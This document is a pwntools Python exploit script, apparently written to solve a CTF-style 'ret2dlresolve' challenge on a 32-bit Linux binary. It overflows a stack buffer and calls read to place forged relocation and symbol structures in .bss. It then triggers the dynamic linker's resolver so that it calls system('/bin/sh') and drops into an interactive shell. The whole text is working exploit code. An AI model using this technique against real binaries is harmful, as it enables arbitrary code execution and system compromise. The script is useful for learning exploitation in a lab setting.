from pwn import *

# the binary is a 32-bit little-endian ELF
context.update(arch='i386', endian='little', os='linux')

elf = ELF('./ret2dlresolve')
p = elf.process()

payload_size = 39
offset = 44

STRTAB 	 = 0x8048298
SYMTAB 	 = 0x8048248
JMPREL 	 = 0x8048314
bss 	 = 0x804c020
read_plt = 0x8049060
resolver = 0x8049030

payload = b'A' * offset
payload += p32(read_plt)
payload += p32(elf.symbols['vuln'])
payload += p32(0x0)
payload += p32(bss)
payload += p32(payload_size)

p.send(payload)

fp = open('payload', 'wb+')
fp.write(payload)

system = b'system\x00'
binsh = b'/bin/sh\x00'

elf_sym = bss + 0x8
align = (0x10 - (elf_sym - SYMTAB) % 0x10) % 0x10
elf_sym += align

sym_offset = (elf_sym - SYMTAB) // 0x10
str_offset = (elf_sym + 0x10) - STRTAB

r_info = (sym_offset << 8) | 0x7

elf_rel = p32(elf.got['read']) + p32(r_info)
elf_sym_struct = p32(str_offset) + p32(0x1)*3

payload = elf_rel
payload += b'A' * align
payload += elf_sym_struct
payload += system

binsh_addr = bss + len(payload)
payload += binsh

payload += b'A' * (payload_size - len(payload))

fp.write(payload)
p.send(payload)

rel_offset = bss - JMPREL

payload = b'A' * offset
payload += p32(resolver)
payload += p32(rel_offset)
payload += p32(0xdeadbeef)
payload += p32(binsh_addr)

fp.write(payload)
p.send(payload)

fp.close()
p.interactive()
